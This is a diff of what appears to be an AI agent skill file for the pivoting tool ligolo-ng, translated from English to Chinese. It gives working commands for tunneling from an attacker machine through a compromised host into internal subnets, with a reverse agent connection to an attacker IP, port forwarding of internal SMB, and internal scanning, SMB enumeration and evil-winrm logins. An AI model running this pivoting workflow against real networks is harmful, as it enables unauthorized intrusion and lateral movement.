@@ -1,103 +1,97 @@
 ---
 name: ligolo-ng
 description: >
-  This skill should be used when the user asks about "ligolo-ng", "pivot into
-  an internal network, tunnel traffic through a compromised host, access
-  internal subnets", "set up a network tunnel without SOCKS proxychains".
-  Reverse tunneling tool that creates a TUN interface on the attacker machine
-  to route traffic into internal networks via a compromised pivot host.
+  此技能适用于用户询问关于"ligolo-ng"、"进入内网、通过被攻陷主机隧道传输流量、访问内部子网"、"在不使用 SOCKS proxychains 的情况下建立网络隧道"。反向隧道工具，通过在攻击者机器上创建 TUN 接口，经由被攻陷的中转主机将流量路由到内部网络。
 ---
 
 # ligolo-ng
 
-Reverse tunneling via TUN interface — cleaner pivot than SOCKS/proxychains, works at network layer.
+通过 TUN 接口进行反向隧道 — 比 SOCKS/proxychains 更简洁的内网穿透方案，工作在网络层。
 
-## Architecture
+## 架构
 
 ```
-Attacker (proxy)  ←—TLS tunnel—  Victim pivot (agent)  ——→  Internal network
-    [TUN iface]                   [compromised host]          192.168.1.0/24
+攻击者 (proxy)  ←—TLS 隧道—  受害中转主机 (agent)  ——→  内部网络
+   [TUN 接口]                   [被攻陷主机]              192.168.1.0/24
 ```
 
-No proxychains needed — all tools work natively against internal IP ranges.
+无需 proxychains — 所有工具可直接对内部 IP 段使用。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Attacker: create TUN interface and start proxy
+# 攻击者：创建 TUN 接口并启动 proxy
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
 
-# Victim pivot host: connect agent to proxy
+# 中转主机（受害者）：将 agent 连接到 proxy
 ./agent -connect <attacker_ip>:11601 -ignore-cert
 
-# Back on attacker proxy console:
-session          # select the agent session
-start            # start tunneling
+# 回到攻击者 proxy 控制台：
+session          # 选择 agent 会话
+start            # 开始隧道
 
-# Add route to internal subnet via TUN interface
+# 在攻击者机器添加内部子网路由
 sudo ip route add 192.168.1.0/24 dev ligolo
 ```
 
-## Proxy Commands (Console)
+## Proxy 控制台命令
 
-| Command | Description |
-|---------|-------------|
-| `session` | List / select active sessions |
-| `start` | Start tunnel for selected session |
-| `stop` | Stop tunnel |
-| `ifconfig` | Show remote interfaces/subnets |
-| `listener_add` | Add port forwarder (agent→proxy) |
-| `listener_list` | List active listeners |
-| `listener_stop` | Stop a listener |
+| 命令 | 说明 |
+|------|------|
+| `session` | 列出/选择活跃会话 |
+| `start` | 为选定会话启动隧道 |
+| `stop` | 停止隧道 |
+| `ifconfig` | 显示远端接口/子网 |
+| `listener_add` | 添加端口转发（agent→proxy） |
+| `listener_list` | 列出活跃监听器 |
+| `listener_stop` | 停止监听器 |
 
-## Port Forwarding (Listener)
+## 端口转发（Listener）
 
-To expose an internal service to the attacker:
+将内部服务暴露给攻击者：
 
 ```bash
-# In proxy console (after selecting session):
+# 在 proxy 控制台（选定会话后）：
 listener_add --addr 0.0.0.0:4444 --to 192.168.1.5:445 --tcp
-# Now target attacker:4444 → internal 192.168.1.5:445
+# 现在访问 attacker:4444 → 内部 192.168.1.5:445
 ```
 
-## Common Workflows
+## 常用工作流
 
 ```bash
-# Full pivot setup
-# Step 1: Start proxy (attacker)
+# 完整内网穿透配置
+# 步骤 1：启动 proxy（攻击者）
 sudo ./proxy -selfcert -laddr 0.0.0.0:11601
 
-# Step 2: Run agent on pivot (upload via web server or existing shell)
-# Linux pivot:
+# 步骤 2：在中转主机上运行 agent（通过 Web 服务器或已有 shell 上传）
+# Linux 中转：
 ./agent -connect 10.10.14.1:11601 -ignore-cert &
-# Windows pivot:
+# Windows 中转：
 agent.exe -connect 10.10.14.1:11601 -ignore-cert
 
-# Step 3: Add route (attacker)
-# In proxy console:
+# 步骤 3：添加路由（攻击者）
+# 在 proxy 控制台：
 session          # ID: 1 - pivot-host
 start
-# In terminal:
+# 在终端：
 sudo ip route add 10.200.1.0/24 dev ligolo
 
-# Step 4: Use internal IPs directly
+# 步骤 4：直接使用内部 IP
 nmap -sS 10.200.1.0/24
 nxc smb 10.200.1.0/24
 evil-winrm -i 10.200.1.50 -u admin -p pass
 ```
 
-## Double Pivot
+## 双重内网穿透 (Double Pivot)
 
-For nested networks (attacker → pivot1 → pivot2 → internal):
-- Run a second agent on pivot2 connecting back through pivot1 (via listener)
-- Add a second TUN interface and route
+用于嵌套网络（攻击者 → 中转1 → 中转2 → 内部）：
+- 在中转2 上运行第二个 agent，通过中转1 上的 listener 回连
+- 添加第二个 TUN 接口和路由
 
-## Resources
+## 参考资源
 
-| File | When to load |
-|------|--------------|
-| `references/pivot-setup.md` | Double pivot, TLS certificate setup, agent persistence, Windows service install |
-
-## Structuring This Skill
+| 文件 | 加载时机 |
+|------|----------|
+| `references/pivot-setup.md` | 双重穿透、TLS 证书配置、agent 持久化、Windows 服务安装 |
